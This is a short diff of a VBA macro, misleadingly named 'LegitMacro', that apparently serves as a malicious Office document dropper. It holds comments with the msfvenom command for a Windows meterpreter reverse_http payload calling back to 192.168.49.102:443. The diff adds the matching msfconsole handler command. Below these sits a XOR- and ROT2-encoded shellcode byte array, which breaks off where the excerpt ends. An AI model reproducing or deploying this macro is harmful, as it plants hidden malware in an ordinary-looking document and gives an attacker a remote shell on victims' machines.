@@ -30,6 +30,7 @@ Sub LegitMacro()
     End If
     
     ' msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.49.102 LPORT=443 EXITFUNC=thread -f vbapplication
+    ' sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_http; set lhost 192.168.49.102; set lport 443; exploit"
     ' Shellcode encoded with XOR with key 0xfa (250) and ROT2 
     buf = Array(8,20,119,252,252,252,156,117,33,205,42,160,115,170,204,115,170,248,115,170,240,247,79,178,222,115,138,212,205,7,205,60,88,200,157,136,250,216,220,61,55,249,253,63,181,145,23,170,115,170, _
     236,115,186,200,175,253,44,115,188,132,129,60,144,184,253,44,115,180,228,172,115,164,220,253,43,129,53,144,200,181,205,7,115,208,115,253,46,205,60,88,61,55,249,253,63,196,28,145,16,251, _
